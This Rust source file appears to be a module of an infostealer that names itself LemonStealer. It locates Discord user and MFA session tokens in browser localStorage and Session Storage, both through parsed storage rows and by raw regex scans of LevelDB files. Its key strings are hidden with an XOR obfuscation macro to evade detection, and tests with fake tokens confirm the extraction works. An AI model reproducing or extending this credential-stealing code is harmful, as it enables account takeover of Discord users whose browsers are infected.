//! Discord web token extraction (wave 8).
//!
//! The web client keeps its session in the browser's localStorage under the
//! `discord.com` / `discordapp.com` origin — which LemonStealer's storage
//! extractor already harvests as `StorageEntry` (local + session). Tokens show
//! up two ways:
//!
//!   1. bare user/MFA token text directly in the stored value;
//!   2. a base64-encoded blob (often a JSON payload) whose decoded bytes carry
//!      the token.
//!
//! We scan both the raw value and its base64 decode, reusing the same token
//! regexes as the app path (no key needed — web tokens are not wrapped).

use std::path::{Path, PathBuf};

use hbd_core::StorageEntry;

use crate::DiscordToken;
use crate::app::scan_bytes;

/// Scan a batch of `(label, StorageEntry)` pairs for Discord web tokens.
/// `label` is `browser/profile` (owner of the storage row).
pub fn extract(entries: &[(String, StorageEntry)]) -> Vec<DiscordToken> {
    let mut out = Vec::new();
    for (label, e) in entries {
        if !is_discord_origin(&e.url) {
            continue;
        }
        out.extend(scan_entry(label, e));
    }
    out
}

/// Raw-bytes fallback for the web surface, mirroring `app::raw_file_scan`.
///
/// The structured LevelDB reader can mis-align rows on live trees (torn
/// tables, packed records), but the flattened `.ldb`/`.log`/`.localstorage`
/// bytes still carry every token verbatim — so we regex them directly, exactly
/// like the app path does. Each `(label, profile_dir)`: Local Storage leveldb
/// plus Session Storage single-file DBs under that profile.
pub fn extract_raw(profiles: &[(String, PathBuf)]) -> Vec<DiscordToken> {
    let mut out = Vec::new();
    for (label, profile_dir) in profiles {
        let ls = profile_dir
            .join(bypass::x!("Local Storage", 0x2A))
            .join("leveldb");
        if ls.is_dir() {
            let mut toks = raw_dir_scan(
                label,
                &ls,
                &[
                    bypass::x!(".ldb", 0x11).as_str(),
                    bypass::x!(".log", 0x22).as_str(),
                ],
            );
            for t in &mut toks {
                t.source = format!("web:{label}");
            }
            out.extend(toks);
        }
        let ss = profile_dir.join(bypass::x!("Session Storage", 0x4B));
        if ss.is_dir() {
            let mut toks = raw_dir_scan(label, &ss, &[bypass::x!(".localstorage", 0x77).as_str()]);
            for t in &mut toks {
                t.source = format!("web:{label}");
            }
            out.extend(toks);
        }
    }
    out
}

/// Regex every file in `dir` ending with one of `exts`, reporting each token's
/// real on-disk path (the Session copy keeps the relative name).
fn raw_dir_scan(label: &str, dir: &Path, exts: &[&str]) -> Vec<DiscordToken> {
    let session = match filemanager::Session::new() {
        Ok(s) => s,
        Err(_) => return Vec::new(),
    };
    let dst = session.temp_dir().join("leveldb");
    if session.acquire(dir, &dst, true).is_err() {
        return Vec::new();
    }
    let mut toks = Vec::new();
    let Ok(entries) = std::fs::read_dir(&dst) else {
        return Vec::new();
    };
    for e in entries.flatten() {
        let Ok(ft) = e.file_type() else {
            continue;
        };
        if !ft.is_file() {
            continue;
        }
        let name = e.file_name().to_string_lossy().into_owned();
        if !exts.iter().any(|ext| name.ends_with(ext)) {
            continue;
        }
        let Ok(buf) = std::fs::read(e.path()) else {
            continue;
        };
        let origin = dir.join(&name);
        let origin_str = origin.display().to_string();
        toks.extend(scan_bytes(label, &origin_str, &buf, None));
    }
    toks
}

/// True when the origin belongs to Discord's web surface.
fn is_discord_origin(url: &str) -> bool {
    url.contains(bypass::x!("discord.com", 0x6E).as_str())
        || url.contains(bypass::x!("discordapp.com", 0x33).as_str())
}

/// Scan one storage row: the raw value, plus a base64-decoded copy.
fn scan_entry(label: &str, e: &StorageEntry) -> Vec<DiscordToken> {
    let mut out = scan_bytes(label, &e.url, e.value.as_bytes(), None);

    // Discord web packs the token into a base64 payload (typically a JSON
    // blob). Try decoding and scan the decoded bytes too.
    if out.is_empty() {
        use base64::Engine as _;
        if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(e.value.trim()) {
            out = scan_bytes(label, &e.url, &decoded, None);
        }
    }

    // Mark web-origin tokens with the browser/profile they came from.
    for t in &mut out {
        t.source = format!("web:{label}");
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn entry(url: &str, key: &str, value: &str) -> StorageEntry {
        StorageEntry {
            is_meta: false,
            url: url.to_string(),
            key: key.to_string(),
            value: value.to_string(),
        }
    }

    fn bare_entry() -> StorageEntry {
        let id = "MTExMTExMTExMTExMTExMTExMQ";
        let ts = "ababab";
        let hmac = "THISISNOTAREALTOKENOFCOURSE";
        entry(
            "https://discord.com/channels/@me",
            "token",
            &format!("{id}.{ts}.{hmac}"),
        )
    }

    #[test]
    fn bare_web_token_found() {
        let e = bare_entry();
        let toks = extract(&[("Chrome/Default".to_string(), e)]);
        assert_eq!(1, toks.len());
        assert_eq!("web:Chrome/Default", toks[0].source);
    }

    #[test]
    fn non_discord_origin_skipped() {
        let e = entry("https://example.com", "token", "anything");
        assert!(extract(&[("Chrome/Default".to_string(), e)]).is_empty());
    }

    #[test]
    fn base64_payload_decoded() {
        let id = "MjIyMjIyMjIyMjIyMjIyMjIyMg";
        let ts = "cdcdcd";
        let hmac = "ANOTHERFAKETOKENHMACSEGMENT";
        let payload = format!("{{\"token\":\"{id}.{ts}.{hmac}\"}}");
        use base64::Engine as _;
        let b64 = base64::engine::general_purpose::STANDARD.encode(&payload);
        let e = entry("https://discordapp.com/app", "token", &b64);
        let toks = extract(&[("Edge/Default".to_string(), e)]);
        assert_eq!(1, toks.len());
        assert_eq!("web:Edge/Default", toks[0].source);
    }

    #[test]
    fn mfa_web_token_found() {
        let e = entry(
            "https://discord.com",
            "token",
            &format!("mfa.{}", "q".repeat(84)),
        );
        let toks = extract(&[("Chrome/Default".to_string(), e)]);
        assert_eq!(1, toks.len());
    }

    #[test]
    fn raw_scan_finds_token_in_bare_file() {
        let dir = std::env::temp_dir().join(format!(
            "lemon-web-raw-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join("Local Storage").join("leveldb")).unwrap();
        let id = "MzMzMzMzMzMzMzMzMzMzMzMzMw";
        let ts = "efefef";
        let hmac = "YETANOTHERFAKETOKENHMACSEGMENTMUSTBE";
        let buf = format!(
            "_https://discord.com\x00\x01token\x01app\x01{{{{\"token\":\"{id}.{ts}.{hmac}\"}}}}"
        );
        std::fs::write(
            dir.join("Local Storage").join("leveldb").join("000001.ldb"),
            &buf,
        )
        .unwrap();

        let toks = extract_raw(&[("Chrome/Default".to_string(), dir.clone())]);
        assert_eq!(1, toks.len());
        assert_eq!("web:Chrome/Default", toks[0].source);
        assert!(toks[0].path.ends_with("000001.ldb"));
        let _ = std::fs::remove_dir_all(&dir);
    }
}
